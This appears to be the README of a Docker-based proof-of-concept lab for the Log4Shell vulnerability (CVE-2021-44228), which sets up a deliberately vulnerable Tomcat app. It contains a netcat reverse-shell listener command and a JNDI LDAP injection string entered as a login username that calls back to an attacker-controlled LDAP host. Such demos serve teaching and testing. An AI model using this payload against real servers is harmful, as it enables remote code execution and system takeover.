# log4j-poc

## An LDAP RCE exploit for CVE-2021-44228 Log4Shell

### Description

The demo Tomcat 8 server on port 8080 has a vulnerable app (log4shell) deployed on it and the server also vulnerable via user-agent attacks.

The remote exploit app in this demo is based on that found at <https://github.com/kozmer/log4j-shell-poc>

This demo tomcat server (Tomcat 8.5.3, Java 1.8.0u51) has been reconfigued to use Log4J2 for logging - a non-standard configuration.

The RMI exploit against the Tomcat 9 / Java 11 server is described here: <https://www.veracode.com/blog/research/exploiting-jndi-injections-java> (Jan 3, 2019) by Michael Stepankin

The detection script will check for user-agent vulnerablities and is from here: <https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6>

### Prerequisites

This code requires Docker and Docker Compose

### Installation

- edit docker-compose.yml file:
  - change value of #LISTENER_ADDR to the local IP of your docker hostmachine
- build docker containers:

```
docker-compose build
```

### Run Web App Attack Demo

- Setup your netcat listener in the first terminal

```
    nc -lv 10.10.10.31 9001
```

- Start the docker containers in a second terminal

```
   docker-compose up
```

- Navigate to <http://10.10.10.31:8080/log4shell>
- Login as "regular" user:
  - Enter the username: `admin`
  - Enter the password: `password`
  - Press the "login" button
- try out log4j vulnerability
  - Return to login at <http://10.10.10.31:8080/log4shell>
  - Enter the username `${jndi:ldap://172.16.238.11:1389/a}`
  - Select the "login" button
  - Check for connection on your `nc` listener
